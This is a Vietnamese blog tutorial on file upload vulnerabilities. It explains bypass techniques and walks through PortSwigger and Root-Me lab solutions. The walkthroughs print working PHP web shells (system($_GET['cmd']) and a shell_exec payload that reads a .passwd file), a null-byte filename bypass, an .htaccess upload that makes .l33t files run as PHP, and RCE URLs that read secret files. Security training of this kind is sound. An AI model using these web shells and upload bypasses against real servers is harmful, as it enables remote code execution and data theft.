---
title: File Upload Vulnerability
published: 2024-09-03
description: 'Learning about FUV'
tags: [Portswigger, Pentest]
category: 'Learning'
draft: false 
image: "/assets/post_image/fuv.png"
---

# WEB SECURITY- FILE UPLOAD VULNERABILITY 

## I. File Upload Vulenrability (FUV) là gì?
![image](https://hackmd.io/_uploads/rkIvTMVsA.png)
* Lỗ hổng tải lên tệp tin **(file upload vulnerabilities)** là các lỗ hổng bảo mật xuất hiện khi máy chủ web cho phép người dùng tải lên các tệp tin mà không kiểm tra đủ các yếu tố như tên, loại, nội dung hoặc kích thước của tệp. Nếu không thực thi đúng các hạn chế, ngay cả một chức năng tải ảnh đơn giản cũng có thể bị lạm dụng để tải lên các tệp tin nguy hiểm. Điều này có thể bao gồm cả các tệp mã lệnh phía máy chủ (server-side script) cho phép thực thi mã từ xa.

## II. Tác hại của lỗ hỏng 

* Tác động của lỗ hổng tải lên tệp tin thường phụ thuộc vào hai yếu tố chính:

    1. Khía cạnh của tệp tin mà trang web không kiểm tra đầy đủ: Đây có thể là kích thước, loại, nội dung, v.v.
    2. Những hạn chế được áp dụng sau khi tệp tin đã được tải lên thành công:
* Trong kịch bản tồi tệ nhất, loại tệp tin không được kiểm tra đúng cách và cấu hình máy chủ cho phép một số loại tệp (như .php và .jsp) được thực thi như mã lệnh. Trong trường hợp này, kẻ tấn công có thể tải lên một tệp mã phía máy chủ hoạt động như một "web shell", cho phép họ kiểm soát hoàn toàn máy chủ.

* Nếu tên tệp không được kiểm tra đúng cách, điều này có thể cho phép kẻ tấn công ghi đè các tệp quan trọng chỉ bằng cách tải lên tệp với cùng tên. Nếu máy chủ cũng bị tổn thương với lỗi "directory traversal" (duyệt thư mục), điều này có thể nghĩa là kẻ tấn công thậm chí có thể tải lên các tệp vào các vị trí không mong đợi.

* Không đảm bảo rằng kích thước của tệp nằm trong các giới hạn dự kiến cũng có thể cho phép một hình thức tấn công từ chối dịch vụ (DoS), trong đó kẻ tấn công làm đầy không gian đĩa khả dụng.


## III. Cách khai thác

* Khi gửi các biểu mẫu HTML, trình duyệt thường gửi dữ liệu đã cung cấp trong request POST với nội dung là `application/x-www-form-url-encoded`. Nó sẽ phù hợp cho việc gửi văn bản đơn giản như tên hoặc địa chỉ của bạn. Tuy nhiên, nó không phù hợp để gửi lượng lớn dữ liệu nhị phân, chẳng hạn như toàn bộ tệp hình ảnh hoặc tài liệu PDF. Trong trường hợp này, loại nội dung `multipart/form-data` được ưa chuộng hơn.

```
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...nội dung nhị phân của example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    Đây là một mô tả thú vị về hình ảnh của tôi.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--

```

* Như ta thấy, phần body của Request được chia ra làm nhiều phần khác nhau ngăn cách bởi dấu `xuống dòng`. Mỗi part sẽ chứa một `Content-Diposition` thứ sẽ cung cấp cho ta một vài thông tin cơ bản về phần nội dung liên quan bên dưới. Và mỗi `Content-Diposition` như vậy cũng sẽ chứa một `Content-Type` tương ứng. Điều này có thể dẫn đến các lỗi nghiêm trọng để đánh lừa hệ thống.

* Nếu hệ thốn chỉ quan tâm việc check `Content-Diposition` thì các Hacker có thể dễ dàng chặn các Request lại và sửa đổi nó trước khi gửi đến `Server`

-> Ta hãy quan sát một vài lỗ hỏng nghiêm trọng liên quan đến file upload

### 1. Bypass ngăn chặn việc thực thi tệp trong các thư mục mà người dùng có thể truy cập

* Các máy chủ thường chỉ chạy các tập lệnh có loại MIME mà chúng đã được cấu hình rõ ràng để thực thi. Nếu không, hệ thống sẽ từ chối thực thi. 

* Nhưng việc ngăn chặn này đôi khi sẽ chỉ là bè nổi=)). Bởi vì chúng không bảo vệ toàn vẹn cả hệ thống mà chỉ ngăn chặn tệp thực thi ở đường dẫn có file upload mà không hề check ở các đường dẫn khác.
 
* Từ đó ta có thể dễ dàng bypass qua bằng cách thay đổi parameter của file ở `Request Header` như `filename="..%2fexploit.php"
    `. Bằng cách dùng `URL Encode` có thể bypass được hàm check của hệ thống

### 2. Bypass Blacklist 

* Một trong những cách ngăn chặn người dùng tải lên các tập tin nguy hiểm là tạo một `blacklist` để chặn các đuôi tập tin có thể gây nguy hiểm như `.php`, `.js` Tuy nhiên, việc chặn đuôi tập tin là một phương pháp không hoàn hảo vì khó có thể chặn hết tất cả các đuôi tập tin có thể được sử dụng để thực thi mã độc. Nhưng cách bảo mật này vẫn có thể bị Bypass bằng cách sử dụng các đuôi tập tin thực thi ít được biết như `.php5`, `.shtml`,...

* Ngoài ra, các cấu hình của máy chủ thường sẽ không cho phép thực thi các tập tin trừ khi chúng đã được cấu hình để làm vậy. Ví dụ, để máy chủ Apache có thể thực thi các tập tin PHP, các lập trình viên cần thêm các chỉ thị vào tập tin cấu hình `/etc/apache2/apache2.conf.` Tương tự, các máy chủ cũng cho phép tạo ra các tập tin cấu hình đặc biệt trong từng thư mục để ghi đè hoặc thêm vào các thiết lập toàn cầu, ví dụ như tập tin `.htaccess` trên Apache hoặc `web.config` trên IIS.

### 3. Bypass using Obfuscated Extension

* Như cái tên thì cách bypass này ta sẽ `làm rối` phần đuôi extension của file. Giả sử mã xác thực có phân biệt chữ hoa chữ thường và không nhận ra rằng `exploit.pHp` thực chất là tệp `.php`. Nếu mã ánh xạ phần `extension` sang loại `MIME` sau đó không phân biệt chữ hoa chữ thường do đó ta có thể dễ dàng bypass được.
* Ngoài ra ta còn có thể sử dụng nhiều cách bypass khác như sau: 

    * **Cung cấp thêm đuôi `extension`**: Để đánh lừa `server` như `file.php.jpg`. Ở đây ta đã thêm đuôi `.jpg` là một extension hình ảnh vào sau đuôi `.php` sau đó `server` sẽ hiểu là đây là một một tệp hình ảnh hoặc `php` tùy vào thuật toán phân tích của `Dev` sử dụng.
    * **Sử dụng `URL Encode`**: Nếu giá trị của file được `upload` không được decode sau khi được `upload` nhưng sau đó được decode để thực thi ở phía `server` thì ta có thể dùng `URL Encode` để bypass như sau `file%2Ephp`. Ở đây ta có thể `Encode` dấu `.` thành `%2E` để có thể dễ dàng bypass được `filter` upload.
    *  Sử dụng `Mulibyte Unicode`: có thể được chuyển đổi thành `Byte Null` và dấu `.` sau khi chuyển đổi hoặc chuẩn hóa unicode. Các chuỗi như `xC0 x2E, xC4 xAE` hoặc `xC0 xAE` có thể được dịch sang `x2E` nếu tên tệp được phân tích dưới dạng chuỗi `UTF-8`, nhưng sau đó được chuyển đổi sang các ký tự `ASCII` trước khi được sử dụng trong một đường dẫn.

## IV. Tiến Hành Khai Thác và Labs

* Sau khi đã tìm hiểu được các cách để khai thác được lỗ hỏng ta tiến hành khai thác với các Labs. Ở đây mình sẽ demo bằng một vài labs ở `Portswigger`

### 1. Labs 2 Web shell upload via obfuscated file extension
![image](https://hackmd.io/_uploads/r1vIFIRpR.png)

* Lab đầu tiên sẽ là upload được `Web shell` thông qua `Obfuscate extension` vừa học.
* Đầu tiên ta sẽ nói đến `Web Shell` là gì? Khi ta khai thác một lỗ hổng và chiếm quyền kiểm soát hệ thống từ xa, chúng ta thường cần một phương pháp để giao tiếp với hệ thống mà không phải liên tục khai thác lại cùng một lỗ hổng để thực hiện từng lệnh. Để kiểm tra chi tiết hệ thống hoặc kiểm soát thêm, chúng ta cần một kết nối đáng tin cậy giúp truy cập trực tiếp vào `shell` của hệ thống, như `Bash` hoặc `PowerShell`, từ đó có thể tiếp tục điều tra hệ thống từ xa cho bước đi tiếp theo.
* Phương pháp khác để truy cập và thực thi mã từ xa trên hệ thống bị xâm phạm là thông qua `shells`. Có 3 loại `shells` chính:
    * **Reverse Shell**: Kết nối ngược trở lại hệ thống của chúng ta và cho phép điều khiển thông qua kết nối đảo ngược.
    * **Bind Shell**: Đợi chúng ta kết nối tới nó và cho phép điều khiển khi đã kết nối.
    * **Web Shell**: Giao tiếp qua một máy chủ web, nhận lệnh thông qua tham số HTTP, thực thi lệnh và trả về kết quả.

--> Hiểu đơn giản thì `Webshell` là một tập lệnh `(script)` được `Attacker` tải lên một máy chủ web bị xâm nhập. Tập lệnh này cho phép chúng thực thi các lệnh hệ thống thông qua giao diện web. `Webshell` thường được viết bằng các ngôn ngữ như `PHP, ASP, JSP,...` và nó cho chúng gửi lệnh từ xa`(RCE)`, qua trình duyệt, thông qua các Request HTTP.

* Quay lại Chall thì đề bài cho biết ta cần lấy `Secret` ở đường dẫn thư mục là `/home/carlos/secret` ở đây mình sẽ có hai cách để code Webshell. 1 là dùng file_get_contents(/home/carlos/secret) để lấy trực tiếp `Secret` ra. 2 là dùng `system($_GET['cmd'])` để có thể `RCE`. Để ta làm quen với `Web Shell` nên mình sẽ dùng cách 2.

![image](https://hackmd.io/_uploads/BJZoGPAp0.png)
* Truy cập vào web và dùng `Credential` được cho đăng nhập vào. Ở phần Upload Avatar thì mình sẽ tiến hành code một script PHP để tiến hành `Inject` `<?php system($_GET['cmd'])>?`

    ![image](https://hackmd.io/_uploads/B1LU4RRTA.png)
* Khi ta upload một file không thuộc extension là `jpg` và `png` thì sẽ bị filter ngay nên tận dụng những gì đã học mình sẽ dùng cách bypass bằng cách thêm `Null byte` vào trước extension như này 

    ![image](https://hackmd.io/_uploads/HJ9ouARTR.png)
* Ở đây mình thêm `%00` vào sau extension `.php` và trước `.jpg` để đánh lừa `server` và đã nhận phản hồi uploaded.

* Ta biết được files upload sẽ được upload ở path `/files/avatars/"files_uploaded"` vì thế mình đến đường dẫn này để xem file đã upload chưa và thực hiện `RCE` bằng payload `https://0a2e00540309cbe9c3142e2f0052008b.web-security-academy.net/files/avatars/shell.php?cmd=ls`. Lệnh `ls` để list ra các file trong thư mục hiện tại đang làm việc và ta thấy được file `shell.php` vừa mới được upload

    ![image](https://hackmd.io/_uploads/ryFwtAAa0.png)

* Từ đây ta có thể RCE để tiến hành thực hiện việc lấy Secret từ đường dẫn cho trước là `/home/carlos/secret` với payload như sau `https://0a2e00540309cbe9c3142e2f0052008b.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret` và nhận được flag

    ![image](https://hackmd.io/_uploads/ryPhFR06A.png)
> xbwZ4ehujuij49I7C8Mu2VWEkSE24XBx

### 2. Lab 2 Web shell upload via extension blacklist bypass

* Ở lab này là thông qua việc `Blacklist Bypasss` 

    ![image](https://hackmd.io/_uploads/SkQV5ACTC.png)

* Lab cũng cho thông tin là `Secret` được giấu ở đường dẫn như cũ. 
* Ta sẽ thử sử dụng lại cách bypass như cũ xem có thành công không thì kết quả là failed 

* Ta có một cách khác để có thể Bypass qua đó là đổi tên `file_name=.htaccess` cho phép cấu hình `Apache`, thay đổi `Content-Type=text/plain` giúp tránh kiểm tra bảo mật, và thêm chỉ thị `AddType application/x-httpd-php .l33t` để cho phép mã PHP trong tệp `.l33t` được thực thi, từ đó có thể `RCE` hệ thống.

    ![image](https://hackmd.io/_uploads/HyvTqeJAA.png)
* Ta nhận được kết quả là thành công. Ok bây giờ ta đã config thành công giờ hãy backward về `Request` trước đó và đổi filename từ `shell.php` thành `shell.l33t`

    ![image](https://hackmd.io/_uploads/rJTKsxyAC.png)

* Ta đã thành công còn giờ chỉ việc lấy ra secret như bài trước thôi 

### Lab 3 File upload - Double extensions

* Lab này sẽ là một bài chall đơn giản ở `Rootme`. Nhìn qua tên file thì ta cũng biết được chall này cần dùng cách bypass là `Double Extensions`. Như đã nói ở phần trên ta có thể thêm các extensions và sau đuôi thực thi để đánh lừa hệ thống và thực thi 1 trong 2 extensions thì ở chall này cũng tương tự.

    ![image](https://hackmd.io/_uploads/ByARJZkR0.png)
* Chall cũng cho ta biết là password sẽ nằm ở file `.passwd` ở thư mục `root` nên mình sẽ có payload như sau để đọc được file `.passwd`

```
<?php
$output = shell_exec('cat ../../../.passwd');
echo "<pre>$output</pre>";
?>
```

* Request sẽ như sau: 

    ![image](https://hackmd.io/_uploads/By9cx-kAA.png)
* Kết quả ta có: 

    ![image](https://hackmd.io/_uploads/BJ2igbkCR.png)
* Click vào link file upload được lưu ta sẽ `RCE` được payload và lấy được flag

> Gg9LRz-hWSxqqUKd77-_q-6G8
